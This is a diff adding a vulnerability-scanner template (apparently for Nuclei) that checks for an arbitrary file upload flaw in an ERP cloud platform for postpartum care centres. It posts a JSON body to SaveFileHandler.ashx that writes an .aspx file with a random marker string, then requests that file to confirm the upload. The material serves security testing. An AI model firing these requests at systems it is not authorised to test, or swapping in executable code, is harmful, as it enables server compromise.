@@ -1,0 +1,38 @@
+id: yuezihuisuo-SaveFileHandler-upload
+
+info:
+  name: 月子会所ERP管理云平台 SaveFileHandler 任意文件上传漏洞
+  author: yuezihuisuo
+  severity: high
+  tags: yuezihuisuo
+
+http:
+  - raw:
+      - |
+        POST /Page/upload/SaveFileHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+
+        {
+          "url": "OA/",
+          "htmlname": "d36s2d5se.aspx",
+          "htmlstr": "{{randstr_1}}"
+        }
+
+      - |+
+        GET /OA/d36s2d5se.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
